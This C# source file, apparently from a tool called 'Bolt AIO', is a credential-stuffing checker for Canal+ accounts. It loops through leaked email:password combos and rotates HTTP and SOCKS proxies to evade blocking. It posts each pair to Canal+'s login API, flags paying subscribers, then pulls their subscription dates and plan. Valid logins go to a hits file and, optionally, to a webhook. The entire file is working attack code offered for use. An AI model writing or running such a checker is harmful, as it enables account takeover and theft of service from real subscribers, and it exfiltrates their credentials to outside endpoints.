using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class MyCanal
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            var capture = new StringBuilder();

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str =
                                "vect=INTERNET&media=IOS%20PHONE&portailId=OQaRQJQkSdM.&distributorId=C22021&analytics=false&trackingPub=false&email=" +
                                array[0] + "&password=" + array[1];
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text2 = req.Post("https://pass-api-v2.canal-plus.com/services/apipublique/login", str,
                                "application/x-www-form-urlencoded").ToString();

                            if (text2.Contains("\"isSubscriber\":true,"))
                            {
                                var str2 = Parse(text2, "passToken\":\"", "\",\"userData");
                                req.AddHeader("Cookie", "s_token=" + str2);
                                var source = req
                                    .Get("https://api-client.canal-plus.com/self/persons/current/subscriptions")
                                    .ToString();
                                var text3 = Parse(source, "startDate\":\"", "\",\"endDate ");
                                var text4 = Parse(source, "endDate\":\"", "\",\"products");
                                var text5 = Parse(source, "commercialLabel\":\"", "\"");
                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Mycanal_hits",
                                    array[0] + ":" + array[1] + " | StartDate: " + text3 + " | EndDate: " + text4 +
                                    " | Sub: " + text5);
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("My Canal",
                                        array[0] + ":" + array[1] + " | StartDate: " + text3 + " | EndDate: " + text4 +
                                        " | Sub: " + text5);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1], "My Canal Hits");
                            }
                            else if (text2.Contains("Login ou mot de passe invalide") ||
                                     text2.Contains("Compte bloque") || text2.Contains("\"isSubscriber\":false,"))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}